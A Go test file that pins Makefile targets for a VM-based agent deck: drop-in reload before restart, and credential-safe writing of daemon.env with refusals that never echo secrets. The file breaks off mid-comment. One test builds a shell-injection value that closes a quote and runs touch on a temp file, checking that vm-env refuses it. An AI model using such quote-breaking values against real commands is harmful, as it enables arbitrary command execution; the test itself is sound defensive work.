// Pins the deck's setup on a new VM (issue #234): make deck-restart reloads the service's drop-ins before it
// restarts the daemon, so a changed drop-in takes effect, and make vm-env refuses to rebuild the VM's
// daemon.env unless every credential its VM_ENV names is in the environment, so a locked login Keychain or an
// unloaded direnv .envrc never wipes the credentials the agents need. VM_ENV itself decides what happens to the
// file (decision recorded on issue #234): the default VM_ENV replaces the whole file, so no stale line - an old
// ANTHROPIC_API_KEY, say, which silently switches Claude Code to pay-as-you-go billing - survives a run, and
// only a VM_ENV given on the make command line merges: it replaces only the names it lists and keeps the plain
// NAME=value lines already in the file. A VM_ENV exported in the environment replaces the whole file too: a
// VM_ENV left behind in a .envrc must not silently keep a stale credential alive (the second-round review of
// issue #234). A VM_ENV the shell would not read as one word is refused before any shell expands it, and a
// merge copies only lines that are plain NAME=value assignments, warning that it dropped the rest.
//
// No test reaches the machine it runs on: the sandbox's fake limactl runs the VM side of every target on this
// machine with the fake VM user's HOME, and systemctl is a recording fake. No value in this file is a real
// credential: the tests invent every one of them (CLAUDE.md rule 3).
package devenv_test

import (
	"errors"
	"io/fs"
	"os"
	"path/filepath"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/google/go-cmp/cmp"
)

// vmEnvCredentials are the names make vm-env copies into the VM by default, in VM_ENV's order (Makefile).
var vmEnvCredentials = []string{"CLAUDE_CODE_OAUTH_TOKEN", "DEEPSEEK_API_KEY", "GITHUB_TOKEN"}

// fakeEnvValue is the invented value the tests give one credential: its name with a fake- prefix, so no
// literal in this file pairs a credential's name with a value (gosec G101) and none is a real credential
// (CLAUDE.md rule 3).
func fakeEnvValue(name string) string {
	return "fake-" + strings.ToLower(name) + "-value"
}

// inventedVMEnvValue builds an invented value for a VM_ENV a shell would hold by mistake, from a label: a
// value the refusal must never echo, and no literal in this file pairs a credential's name with one (gosec
// G101, CLAUDE.md rule 3).
func inventedVMEnvValue(label string) string {
	return "fake-" + label
}

// vmEnvInvalidTail returns what follows the first character VM_ENV may not hold - the part of a refused
// VM_ENV that is most likely the value a maintainer's shell built, which a refusal must never print - or the
// empty string when vmEnv holds only the characters make vm-env reads as one word (a letter, a digit, an
// underscore, a comma or a space).
func vmEnvInvalidTail(vmEnv string) string {
	for i := 0; i < len(vmEnv); i++ {
		c := vmEnv[i]

		named := c == '_' || c == ',' || c == ' ' ||
			(c >= '0' && c <= '9') || (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')
		if !named {
			return vmEnv[i+1:]
		}
	}

	return ""
}

// seededDaemonEnv is what the VM's daemon.env holds before a case: the credentials a previous make vm-env
// wrote. A refused run leaves exactly these bytes behind.
const seededDaemonEnv = "CLAUDE_CODE_OAUTH_TOKEN=old-oauth\nDEEPSEEK_API_KEY=old-deepseek\nGITHUB_TOKEN=old-github\n"

// daemonEnvPath is the VM's ~/.config/dot-agent-deck/daemon.env, the file make vm-env writes and the
// credentials.conf drop-in reads at every start.
func (sb *sandbox) daemonEnvPath() string {
	return sb.vmPath(".config/dot-agent-deck/daemon.env")
}

// seedDaemonEnv writes the VM's daemon.env the way a previous make vm-env left it, and returns its bytes.
func (sb *sandbox) seedDaemonEnv(t *testing.T) []byte {
	t.Helper()

	return sb.seedDaemonEnvWith(t)
}

// seedDaemonEnvWith writes the VM's daemon.env as a previous make vm-env left it plus extra lines, the way a
// maintainer or an earlier target left a setting vm-env does not know about, and returns its bytes.
func (sb *sandbox) seedDaemonEnvWith(t *testing.T, extra ...string) []byte {
	t.Helper()

	body := seededDaemonEnv
	for _, line := range extra {
		body += line + "\n"
	}

	writeFileMode(t, sb.daemonEnvPath(), []byte(body), 0o600)

	return []byte(body)
}

// vmEnvEnv is the environment one run of make vm-env gets: the sandbox's PATH with the fake limactl first, a
// temporary HOME, and the three credentials with invented values. No other variable of the test process's own
// environment is passed on, so a real credential of the machine can never reach the VM (CLAUDE.md rule 3).
// VM_ENV is never one of them: where it comes from decides whether vm-env merges or replaces (issue #234), so
// a value exported in the environment of the process running the test must not stand in for one a case sets,
// and a case that wants one in the environment calls withVMEnvInEnv.
func (sb *sandbox) vmEnvEnv() map[string]string {
	env := sb.baseEnv()
	env["PATH"] = sb.binDir + ":/usr/local/bin:/usr/bin:/bin"
	delete(env, "VM_ENV")

	for _, name := range vmEnvCredentials {
		env[name] = fakeEnvValue(name)
	}

	return env
}

// withVMEnvInEnv hands VM_ENV to make in its environment instead of on the command line, the way a VM_ENV
// exported from a .envrc (or by hand) reaches it. Only a VM_ENV given on the command line merges: one that
// arrives this way must replace the whole file, so a stale credential left in a .envrc can never be kept alive
// by a merge the maintainer did not ask for (issue #234).
func withVMEnvInEnv(env map[string]string, vmEnv string) map[string]string {
	env["VM_ENV"] = vmEnv

	return env
}

// assertNoLimaCalls fails when make handed limactl anything at all. Every refusal make vm-env makes is made
// before the VM is touched, so a refused run costs no connection to the VM and writes nothing in it (issue #234).
func (sb *sandbox) assertNoLimaCalls(t *testing.T, why string) {
	t.Helper()

	log := sb.argvLogText(t)

	if calls := invocations(log, "limactl"); len(calls) > 0 {
		t.Errorf("make vm-env called limactl %d time(s) although %s: a refused run must not reach the VM at all, so nothing there can be written (issue #234):\n%s",
			len(calls), why, log)
	}
}

// assertNoCredentialValues fails when text holds the value of any credential the tests invented. The failure
// names the variable, never its value (CLAUDE.md rule 3).
func assertNoCredentialValues(t *testing.T, where, text string) {
	t.Helper()

	secrets := make([]secret, 0, len(vmEnvCredentials))
	for _, name := range vmEnvCredentials {
		secrets = append(secrets, secret{kind: "value of " + name, value: fakeEnvValue(name)})
	}

	assertNoSecrets(t, where, text, secrets)
}

// sortedEnvLines returns the non-empty lines of a daemon.env, sorted: the order of the lines is not what the
// tests pin, the set of NAME=value lines is.
func sortedEnvLines(body string) []string {
	var lines []string

	for _, line := range strings.Split(body, "\n") {
		if strings.TrimSpace(line) != "" {
			lines = append(lines, strings.TrimSpace(line))
		}
	}

	slices.Sort(lines)

	return lines
}

// TestMakeDeckRestartReloadsDropInsBeforeTheRestart pins issue #234's second half: `make deck-restart` asks the
// VM's user manager to reload the units before it restarts dot-agent-deck.service. Without the reload, a
// drop-in dev/lima.yaml rewrote stays unread, and deck-restart warns that the unit changed on disk; with the
// restart and no reload, the daemon comes back with the old settings.
func TestMakeDeckRestartReloadsDropInsBeforeTheRestart(t *testing.T) {
	t.Parallel()

	sb := newSandbox(t)
	sb.useFakeSystemctl(t)

	env := sb.baseEnv()
	env["PATH"] = sb.binDir + ":/usr/local/bin:/usr/bin:/bin"

	stdout, stderr, err := runMake(t, []string{"deck-restart"}, env)
	if err != nil {
		t.Fatalf("make deck-restart: %v\nstdout: %s\nstderr: %s", err, stdout, stderr)
	}

	var got []string

	for _, args := range invocations(sb.argvLogText(t), "systemctl") {
		got = append(got, "systemctl "+strings.Join(args, " "))
	}

	// The reload first, then the restart: a drop-in is read by the reload, and a reload after the restart would
	// leave the running daemon on the old settings until the next one.
	want := []string{
		"systemctl --user daemon-reload",
		"systemctl --user restart dot-agent-deck.service",
	}

	if diff := cmp.Diff(want, got); diff != "" {
		t.Errorf("make deck-restart asks the VM's user manager for (-want +got):\n%s\nIt must run `systemctl --user daemon-reload` before `systemctl --user restart dot-agent-deck.service`, so a drop-in dev/lima.yaml rewrote takes effect (issue #234)", diff)
	}
}

// TestMakeVMEnvRefusesMissingCredentials pins issue #234's third half: make vm-env checks every name in VM_ENV
// before it writes anything, and refuses when one is unset or empty, naming it and leaving the VM's daemon.env
// byte for byte as it was. A locked login Keychain or an unloaded direnv .envrc in an SSH session used to write
// an empty file, and every agent started without CLAUDE_CODE_OAUTH_TOKEN after the next deck-restart.
func TestMakeVMEnvRefusesMissingCredentials(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name  string
		unset []string // names left out of make's environment entirely
		empty []string // names make sees as the empty string
		named []string // names the refusal must print
	}{
		{
			name:  "one credential unset",
			unset: []string{"GITHUB_TOKEN"},
			named: []string{"GITHUB_TOKEN"},
		},
		{
			name:  "one credential set to an empty string",
			empty: []string{"DEEPSEEK_API_KEY"},
			named: []string{"DEEPSEEK_API_KEY"},
		},
		{
			name:  "every credential unset",
			unset: vmEnvCredentials,
			named: vmEnvCredentials,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			sb := newSandbox(t)
			env := sb.vmEnvEnv()

			for _, name := range tc.unset {
				delete(env, name)
			}

			for _, name := range tc.empty {
				env[name] = ""
			}

			seeded := sb.seedDaemonEnv(t)

			stdout, stderr, err := runMake(t, []string{"vm-env"}, env)
			if err == nil {
				t.Fatalf("make vm-env exited 0 with %s missing: it must refuse, so the VM keeps the credentials it has instead of getting a daemon.env without them (issue #234)\nstdout: %s\nstderr: %s",
					strings.Join(tc.named, ", "), stdout, stderr)
			}

			for _, name := range tc.named {
				if !strings.Contains(stdout+stderr, name) {
					t.Errorf("the refusal does not name %s, so a maintainer cannot tell which credential is missing:\nstdout: %s\nstderr: %s", name, stdout, stderr)
				}
			}

			got, readErr := os.ReadFile(sb.daemonEnvPath())
			if readErr != nil {
				t.Fatalf("read the VM's daemon.env after a refused make vm-env: %v", readErr)
			}

			if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
				t.Errorf("make vm-env rewrote the VM's daemon.env although it refused: the file must be byte for byte what it was (issue #234) (-want +got):\n%s", diff)
			}

			// A refusal before the VM is touched at all: nothing handed limactl writes daemon.env, because
			// nothing is handed limactl.
			sb.assertNoLimaCalls(t, "a missing credential is refused")

			assertNoCredentialValues(t, "make vm-env's output", stdout+stderr)
		})
	}
}

// TestMakeVMEnvRefusesANameThatIsNotAVariable pins the other refusal make vm-env makes before it writes
// anything (issue #234): a VM_ENV name that is not a shell identifier - it starts with a digit, or holds a
// character a variable name may not have - is refused instead of written into daemon.env, where the line
// would be meaningless and printenv could never have set it. Every credential is set, so the refusal is
// about the name and not about a missing credential, and the file stays byte for byte as it was.
//
// What the refusal may show differs between the two checks. A value holding a character the character class
// refuses is never echoed at all - not even the offending name - because it may be a credential a maintainer
// pasted into VM_ENV by mistake (issue #234 audit L1). A value that got past the character class and is
// refused per name held nothing but names, commas and spaces, so naming the offending name back reveals no
// credential and is what the maintainer needs to see.
func TestMakeVMEnvRefusesANameThatIsNotAVariable(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name   string
		vmEnv  string // the invented name handed to VM_ENV; no variable of the test machine is ever named so
		reason string
		// echoesTheName is whether the refusal may show what VM_ENV held: only the per-name check names the
		// name it refused back, the character-class refusal shows none of its value (issue #234 audit L1).
		echoesTheName bool
	}{
		{
			name:          "the name starts with a digit",
			vmEnv:         "1INVENTED_TOKEN",
			reason:        "a name may not start with a digit",
			echoesTheName: true,
		},
		{
			name:   "the name holds a dash",
			vmEnv:  "INVENTED-TOKEN",
			reason: "a variable name never holds a dash",
		},
		{
			name:   "the name holds a dot",
			vmEnv:  "INVENTED.TOKEN",
			reason: "a variable name never holds a dot",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			sb := newSandbox(t)
			env := sb.vmEnvEnv()

			// The credentials VM_ENV lists are all set, so a refusal can only be about tc.vmEnv.
			seeded := sb.seedDaemonEnv(t)

			stdout, stderr, err := runMake(t, []string{"vm-env", "VM_ENV=" + tc.vmEnv}, env)
			if err == nil {
				t.Fatalf("make vm-env VM_ENV=%s exited 0: it must refuse a name that is not a variable (%s), so no line printenv could never set reaches daemon.env (issue #234)\nstdout: %s\nstderr: %s",
					tc.vmEnv, tc.reason, stdout, stderr)
			}

			text := stdout + stderr

			if tc.echoesTheName {
				if !strings.Contains(text, tc.vmEnv) {
					t.Errorf("the refusal does not name %s, so a maintainer cannot tell which VM_ENV name vm-env refused (%s):\nstdout: %s\nstderr: %s",
						tc.vmEnv, tc.reason, stdout, stderr)
				}
			} else {
				if !strings.Contains(text, "VM_ENV") {
					t.Errorf("the refusal does not name VM_ENV, so a maintainer cannot tell that the VM_ENV they passed is what vm-env refused (%s):\nstdout: %s\nstderr: %s",
						tc.reason, stdout, stderr)
				}

				if !strings.Contains(strings.ToLower(text), "not shown") {
					t.Errorf("the refusal does not say that VM_ENV's value is not shown, so a maintainer cannot tell whether the value they handed vm-env was echoed (%s) (issue #234 audit L1):\nstdout: %s\nstderr: %s",
						tc.reason, stdout, stderr)
				}

				// None of it: a character the character class refuses may be where a maintainer pasted a
				// credential, so the refusal must not reproduce it (issue #234 audit L1).
				if strings.Contains(text, tc.vmEnv) {
					t.Errorf("the refusal echoes the value VM_ENV held: the character-class refusal must show none of it, because a maintainer may have pasted a credential there by mistake (%s) (issue #234 audit L1):\nstdout: %s\nstderr: %s",
						tc.reason, stdout, stderr)
				}
			}

			got, readErr := os.ReadFile(sb.daemonEnvPath())
			if readErr != nil {
				t.Fatalf("read the VM's daemon.env after a refused make vm-env: %v", readErr)
			}

			if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
				t.Errorf("make vm-env rewrote the VM's daemon.env although it refused %s: the file must be byte for byte what it was (issue #234) (-want +got):\n%s",
					tc.vmEnv, diff)
			}

			// A refusal before the VM is touched at all: nothing handed limactl writes daemon.env, because
			// nothing is handed limactl.
			sb.assertNoLimaCalls(t, "a name that is not a variable is refused")

			assertNoCredentialValues(t, "make vm-env's output", stdout+stderr)
		})
	}
}

// TestMakeVMEnvRefusalSaysHowToFixIt pins that the refusal is actionable, in the order a maintainer needs it:
// unlock the login Keychain (a macOS SSH session, where the credentials come from the Keychain), re-enter the
// checkout so direnv reloads the .envrc (other hosts, where they come from direnv), then run make vm-env again.
func TestMakeVMEnvRefusalSaysHowToFixIt(t *testing.T) {
	t.Parallel()

	sb := newSandbox(t)
	env := sb.vmEnvEnv()
	delete(env, "CLAUDE_CODE_OAUTH_TOKEN")

	stdout, stderr, err := runMake(t, []string{"vm-env"}, env)
	if err == nil {
		t.Fatalf("make vm-env exited 0 with CLAUDE_CODE_OAUTH_TOKEN missing: it must refuse (issue #234)\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	text := stdout + stderr

	// The steps, in the order the refusal must name them: unlocking the Keychain first (the macOS case), then
	// re-entering the checkout so direnv reloads the .envrc, then the target again. The wording around them is
	// not pinned, the steps and their order are.
	steps := []string{
		"security unlock-keychain",
		"~/Library/Keychains/login.keychain-db",
		"cd ~ && cd",
		"make vm-env",
	}

	at := -1
	previous := ""

	for _, step := range steps {
		next := strings.Index(text, step)
		if next < 0 {
			t.Errorf("the refusal never mentions %q, so a maintainer whose Keychain is locked or whose .envrc is not loaded does not learn what to do (issue #234):\nstdout: %s\nstderr: %s", step, stdout, stderr)

			continue
		}

		if next < at {
			t.Errorf("the refusal mentions %q before %q: it must name the steps in the order they are done - unlock the login Keychain, re-enter the checkout so direnv reloads the .envrc, then run make vm-env again (issue #234):\nstdout: %s\nstderr: %s",
				step, previous, stdout, stderr)
		}

		at, previous = next, step
	}

	// The non-macOS host, where the credentials come from direnv.
	if !strings.Contains(text, ".envrc") {
		t.Errorf("the refusal does not name the direnv .envrc, the source of the credentials on a host without the login Keychain (issue #234):\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	// The refusal is made before the VM is touched: no connection, nothing written there.
	sb.assertNoLimaCalls(t, "a missing credential is refused")

	assertNoCredentialValues(t, "make vm-env's refusal", text)
}

// TestMakeVMEnvRefusesAnEmptyVMEnv pins where the narrowed merge stops (issue #234 review): `make vm-env
// VM_ENV=` names nothing at all, and vm-env must refuse it. A merge with nothing named replaces nothing and
// would leave the file as it was - or, as it did, append a blank line - while a replacement would empty it: both
// are a daemon.env the agents cannot start with. Every credential is set, so the refusal can only be about the
// empty VM_ENV, and the file stays byte for byte as it was.
func TestMakeVMEnvRefusesAnEmptyVMEnv(t *testing.T) {
	t.Parallel()

	sb := newSandbox(t)
	env := sb.vmEnvEnv()
	seeded := sb.seedDaemonEnv(t)

	stdout, stderr, err := runMake(t, []string{"vm-env", "VM_ENV="}, env)
	text := stdout + stderr

	if err == nil {
		t.Fatalf("make vm-env VM_ENV= exited 0: an empty VM_ENV names no credential, so it must be refused instead of leaving a daemon.env without the credentials the agents need (issue #234)\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	if !strings.Contains(text, "VM_ENV") {
		t.Errorf("the refusal does not name VM_ENV, so a maintainer cannot tell that the empty VM_ENV is what vm-env refused (issue #234):\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	lower := strings.ToLower(text)
	if !strings.Contains(lower, "empty") && !strings.Contains(lower, "names nothing") {
		t.Errorf("the refusal does not say that the VM_ENV it was given is empty and names nothing: a silent non-zero exit reads like a broken target, not like a typo in VM_ENV (issue #234):\nstdout: %s\nstderr: %s", stdout, stderr)
	}

	sb.assertNoLimaCalls(t, "an empty VM_ENV is refused")

	got, readErr := os.ReadFile(sb.daemonEnvPath())
	if readErr != nil {
		t.Fatalf("read the VM's daemon.env after a refused make vm-env: %v", readErr)
	}

	if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
		t.Errorf("make vm-env rewrote the VM's daemon.env although VM_ENV named nothing: the file must be byte for byte what it was, so no blank line is appended either (issue #234) (-want +got):\n%s", diff)
	}

	assertNoCredentialValues(t, "make vm-env's output", text)
}

// TestMakeVMEnvWritesTheCredentialsItNames pins what a run with every credential set writes to the VM's
// daemon.env, mode 0600, whether the VM has the file yet or not (issue #234). VM_ENV decides the rest: the
// default VM_ENV replaces the whole file, so a line it does not name - a stale ANTHROPIC_API_KEY left by an
// earlier setup, which silently switches Claude Code to pay-as-you-go billing - never survives a full run.
// So does a VM_ENV exported in make's environment: only one given on the make command line merges, and a
// command-line VM_ENV keeps every plain line it does not name, so `make vm-env VM_ENV=GITHUB_TOKEN` drops
// nothing (the decision and its second-round correction on issue #234).
func TestMakeVMEnvWritesTheCredentialsItNames(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name string
		seed bool // the VM already has a daemon.env, as after an earlier make vm-env
		// extra are the lines of an earlier daemon.env that VM_ENV does not name.
		extra []string
		// args are further arguments on the make command line - an explicit VM_ENV, which is what decides
		// whether the file is replaced or merged.
		args []string
		// envVMEnv is a VM_ENV exported in make's environment rather than given on the command line: it does
		// not merge, so the whole file is replaced as by the default VM_ENV.
		envVMEnv string
		// kept are the lines of the earlier daemon.env that survive the run: an explicit VM_ENV replaces only
		// the names it lists and keeps every other line.
		kept []string
	}{
		{name: "the VM has no daemon.env yet, the first run"},
		{name: "the VM has a daemon.env already", seed: true},
		{
			name:  "the default VM_ENV replaces a line it does not name",
			seed:  true,
			extra: []string{"UNRELATED_SETTING=not-kept-by-the-default"},
		},
		{
			name:  "a VM_ENV exported in the environment replaces a line it does not name",
			seed:  true,
			extra: []string{"UNRELATED_SETTING=not-kept-by-the-environment"},
			// The same names the default VM_ENV lists, so only where the VM_ENV comes from tells the two
			// cases apart: in the environment it must still replace the whole file.
			envVMEnv: strings.Join(vmEnvCredentials, ","),
		},
		{
			name:  "an explicit VM_ENV merges and keeps a line it does not name",
			seed:  true,
			extra: []string{"UNRELATED_SETTING=kept-by-the-merge"},
			args:  []string{"VM_ENV=" + strings.Join(vmEnvCredentials, ",")},
			kept:  []string{"UNRELATED_SETTING=kept-by-the-merge"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			sb := newSandbox(t)
			env := sb.vmEnvEnv()

			if tc.envVMEnv != "" {
				env = withVMEnvInEnv(env, tc.envVMEnv)
			}

			if tc.seed {
				sb.seedDaemonEnvWith(t, tc.extra...)
			}

			stdout, stderr, err := runMake(t, append([]string{"vm-env"}, tc.args...), env)
			if err != nil {
				t.Fatalf("make vm-env %s with every credential set: %v\nstdout: %s\nstderr: %s",
					strings.Join(tc.args, " "), err, stdout, stderr)
			}

			info, statErr := os.Stat(sb.daemonEnvPath())
			if statErr != nil {
				t.Fatalf("make vm-env wrote no ~/.config/dot-agent-deck/daemon.env in the VM: %v", statErr)
			}

			if got := info.Mode().Perm(); got != 0o600 {
				t.Errorf("the VM's daemon.env is mode %04o, want 0600: it holds the agent credentials (issue #234, PRD #161 milestone 1)", got)
			}

			body, readErr := os.ReadFile(sb.daemonEnvPath())
			if readErr != nil {
				t.Fatalf("read the VM's daemon.env: %v", readErr)
			}

			want := []string{
				"CLAUDE_CODE_OAUTH_TOKEN=" + fakeEnvValue("CLAUDE_CODE_OAUTH_TOKEN"),
				"DEEPSEEK_API_KEY=" + fakeEnvValue("DEEPSEEK_API_KEY"),
				"GITHUB_TOKEN=" + fakeEnvValue("GITHUB_TOKEN"),
			}
			// The default VM_ENV and one exported in the environment write the whole file; only a
			// command-line VM_ENV keeps every other plain line, so a setting vm-env does not know about is
			// never lost by a merge (the decision on issue #234).
			want = append(want, tc.kept...)

			if diff := cmp.Diff(sortedEnvLines(strings.Join(want, "\n")), sortedEnvLines(string(body))); diff != "" {
				t.Errorf("make vm-env wrote the wrong lines to the VM's daemon.env (-want +got):\n%s", diff)
			}

			assertNoCredentialValues(t, "make vm-env's output", stdout+stderr)
		})
	}
}

// TestMakeVMEnvNarrowedVMEnvKeepsTheOtherCredentials pins the decision recorded on issue #234: making vm-env
// write only a few names by narrowing VM_ENV merges - it replaces the names it lists and keeps every other line
// already in the file - so `make vm-env VM_ENV=GITHUB_TOKEN` never drops the OAuth token and the DeepSeek key.
// A narrowed name that is missing is refused like any other, and the file stays as it was.
func TestMakeVMEnvNarrowedVMEnvKeepsTheOtherCredentials(t *testing.T) {
	t.Parallel()

	t.Run("the name it lists is replaced and the others are kept", func(t *testing.T) {
		t.Parallel()

		sb := newSandbox(t)
		env := sb.vmEnvEnv()
		delete(env, "CLAUDE_CODE_OAUTH_TOKEN")
		delete(env, "DEEPSEEK_API_KEY")

		sb.seedDaemonEnv(t)

		stdout, stderr, err := runMake(t, []string{"vm-env", "VM_ENV=GITHUB_TOKEN"}, env)
		if err != nil {
			t.Fatalf("make vm-env VM_ENV=GITHUB_TOKEN with GITHUB_TOKEN set: %v\nstdout: %s\nstderr: %s", err, stdout, stderr)
		}

		body, readErr := os.ReadFile(sb.daemonEnvPath())
		if readErr != nil {
			t.Fatalf("read the VM's daemon.env: %v", readErr)
		}

		want := []string{
			"CLAUDE_CODE_OAUTH_TOKEN=old-oauth",
			"DEEPSEEK_API_KEY=old-deepseek",
			"GITHUB_TOKEN=" + fakeEnvValue("GITHUB_TOKEN"),
		}

		if diff := cmp.Diff(sortedEnvLines(strings.Join(want, "\n")), sortedEnvLines(string(body))); diff != "" {
			t.Errorf("make vm-env VM_ENV=GITHUB_TOKEN wrote the wrong lines to the VM's daemon.env: it must replace GITHUB_TOKEN and keep every other line already in the file (issue #234) (-want +got):\n%s", diff)
		}

		// A merge says, by name, which lines it left in place (the auditor's finding on issue #234): the
		// maintainer who narrows VM_ENV to one credential must see from the run itself what stays in
		// daemon.env, without opening the file and without any value being printed.
		keptNames := slices.DeleteFunc(slices.Clone(vmEnvCredentials), func(name string) bool {
			return name == "GITHUB_TOKEN"
		})

		for _, name := range keptNames {
			if !strings.Contains(stdout+stderr, name) {
				t.Errorf("make vm-env VM_ENV=GITHUB_TOKEN kept the line daemon.env already held for %s but never names it: a merge must print the names - only the names - of the lines it kept, so a maintainer sees what stays in the file (issue #234)\nstdout: %s\nstderr: %s",
					name, stdout, stderr)
			}
		}

		// Names only, never values: neither the ones the file held before the run nor the ones it copied in.
		assertNoSecrets(t, "make vm-env VM_ENV=GITHUB_TOKEN's output", stdout+stderr, []secret{
			{kind: "earlier value of CLAUDE_CODE_OAUTH_TOKEN", value: "old-oauth"},
			{kind: "earlier value of DEEPSEEK_API_KEY", value: "old-deepseek"},
			{kind: "earlier value of GITHUB_TOKEN", value: "old-github"},
		})

		assertNoCredentialValues(t, "make vm-env's output", stdout+stderr)
	})

	t.Run("a name listed twice is written once", func(t *testing.T) {
		t.Parallel()

		sb := newSandbox(t)
		env := sb.vmEnvEnv()
		delete(env, "CLAUDE_CODE_OAUTH_TOKEN")
		delete(env, "DEEPSEEK_API_KEY")

		sb.seedDaemonEnv(t)

		stdout, stderr, err := runMake(t, []string{"vm-env", "VM_ENV=GITHUB_TOKEN,GITHUB_TOKEN"}, env)
		if err != nil {
			t.Fatalf("make vm-env VM_ENV=GITHUB_TOKEN,GITHUB_TOKEN with GITHUB_TOKEN set: %v\nstdout: %s\nstderr: %s", err, stdout, stderr)
		}

		body, readErr := os.ReadFile(sb.daemonEnvPath())
		if readErr != nil {
			t.Fatalf("read the VM's daemon.env: %v", readErr)
		}

		want := "GITHUB_TOKEN=" + fakeEnvValue("GITHUB_TOKEN")

		written := 0

		for _, line := range sortedEnvLines(string(body)) {
			if strings.HasPrefix(line, "GITHUB_TOKEN=") {
				written++
			}
		}

		if written != 1 {
			t.Errorf("make vm-env VM_ENV=GITHUB_TOKEN,GITHUB_TOKEN wrote %d GITHUB_TOKEN lines, want exactly 1: a name listed twice reaches daemon.env once, so the file stays one line per credential (issue #234). The lines it wrote: %v",
				written, sortedEnvLines(string(body)))
		}

		if !slices.Contains(sortedEnvLines(string(body)), want) {
			t.Errorf("make vm-env VM_ENV=GITHUB_TOKEN,GITHUB_TOKEN did not write the value it was given to daemon.env: the lines it wrote are %v, want one of them the GITHUB_TOKEN line with the value the shell held (issue #234)",
				sortedEnvLines(string(body)))
		}

		assertNoCredentialValues(t, "make vm-env's output", stdout+stderr)
	})

	t.Run("the name it lists is missing, so it is refused and the file is kept", func(t *testing.T) {
		t.Parallel()

		sb := newSandbox(t)
		env := sb.vmEnvEnv()
		for _, name := range vmEnvCredentials {
			delete(env, name)
		}

		seeded := sb.seedDaemonEnv(t)

		stdout, stderr, err := runMake(t, []string{"vm-env", "VM_ENV=GITHUB_TOKEN"}, env)
		if err == nil {
			t.Fatalf("make vm-env VM_ENV=GITHUB_TOKEN exited 0 with GITHUB_TOKEN missing: a narrowed VM_ENV must be refused like any other, so the VM keeps the credentials it has (issue #234)\nstdout: %s\nstderr: %s", stdout, stderr)
		}

		if !strings.Contains(stdout+stderr, "GITHUB_TOKEN") {
			t.Errorf("the refusal does not name GITHUB_TOKEN, the one name VM_ENV lists:\nstdout: %s\nstderr: %s", stdout, stderr)
		}

		got, readErr := os.ReadFile(sb.daemonEnvPath())
		if readErr != nil {
			t.Fatalf("read the VM's daemon.env after a refused make vm-env: %v", readErr)
		}

		if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
			t.Errorf("make vm-env rewrote the VM's daemon.env although it refused: the file must be byte for byte what it was (issue #234) (-want +got):\n%s", diff)
		}

		// A refusal before the VM is touched at all: nothing handed limactl writes daemon.env, because
		// nothing is handed limactl.
		sb.assertNoLimaCalls(t, "a missing narrowed name is refused")
	})
}

// TestMakeVMEnvRefusesAQuoteBeforeTheShellSeesIt pins the second-round audit finding on issue #234: the names
// in VM_ENV reach the recipe inside shell quoting, so a value that closes the quote runs whatever follows it on
// the host - a name holding a single quote and a command behind it would touch a file before vm-env had checked
// anything. vm-env must refuse such a VM_ENV before a shell expands it, whether it is on the command line or in
// the environment: non-zero, nothing run on the host, nothing handed limactl, and the VM's daemon.env byte for
// byte as it was.
func TestMakeVMEnvRefusesAQuoteBeforeTheShellSeesIt(t *testing.T) {
	t.Parallel()

	cases := []struct {
		name  string
		inEnv bool // VM_ENV exported in make's environment instead of given on the command line
	}{
		{name: "on the command line"},
		{name: "in the environment", inEnv: true},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			sb := newSandbox(t)
			env := sb.vmEnvEnv()
			seeded := sb.seedDaemonEnv(t)

			// The value a maintainer's .envrc or a mistyped command line could hold: a valid name, a quote
			// that ends the quoted word, and a command that runs if the quote is not refused.
			pwned := filepath.Join(t.TempDir(), "pwned")
			vmEnv := "GITHUB_TOKEN';touch " + pwned + ";'"

			args := []string{"vm-env"}

			if tc.inEnv {
				env = withVMEnvInEnv(env, vmEnv)
			} else {
				args = append(args, "VM_ENV="+vmEnv)
			}

			stdout, stderr, err := runMake(t, args, env)
			text := stdout + stderr

			if err == nil {
				t.Errorf("make vm-env exited 0 with a VM_ENV holding a single quote: it must refuse a value the shell would split into several words before it expands it, so nothing behind the quote is ever run (issue #234)\nstdout: %s\nstderr: %s", stdout, stderr)
			}

			if !strings.Contains(text, "VM_ENV") {
				t.Errorf("the refusal does not name VM_ENV, so a maintainer cannot tell that the VM_ENV they passed is what vm-env refused (issue #234):\nstdout: %s\nstderr: %s", stdout, stderr)
			}

			// The command behind the quote never ran on the host.
			if _, statErr := os.Stat(pwned); !errors.Is(statErr, fs.ErrNotExist) {
				t.Errorf("make vm-env ran the command behind the single quote in VM_ENV: %s exists, so the quote closed the word the recipe built and the shell ran what followed it. A VM_ENV the shell cannot read as one word must be refused before any shell sees it (issue #234, stat error: %v)",
					pwned, statErr)
			}

			sb.assertNoLimaCalls(t, "a VM_ENV holding a single quote is refused")

			got, readErr := os.ReadFile(sb.daemonEnvPath())
			if readErr != nil {
				t.Fatalf("read the VM's daemon.env after a refused make vm-env: %v", readErr)
			}

			if diff := cmp.Diff(string(seeded), string(got)); diff != "" {
				t.Errorf("make vm-env rewrote the VM's daemon.env although there was no VM_ENV it could read: the file must be byte for byte what it was (issue #234) (-want +got):\n%s", diff)
			}

			assertNoCredentialValues(t, "make vm-env's output", text)
		})
	}
}

// TestMakeVMEnvRefusalNeverEchoesTheVMEnv pins the final-round audit finding on issue #234 (L1, review 1): a
// VM_ENV the shell would not read as one word is refused, and the refusal must not print it. A VM_ENV can hold
// a credential by mistake - a pasted token, or a NAME=value line a maintainer meant as a shell assignment - so
// echoing it writes that value into a terminal's scrollback, a CI log or a screenshot, which is exactly the
// leak every other rule around vm-env avoids. The refusal names VM_ENV and neither echoes the value nor the
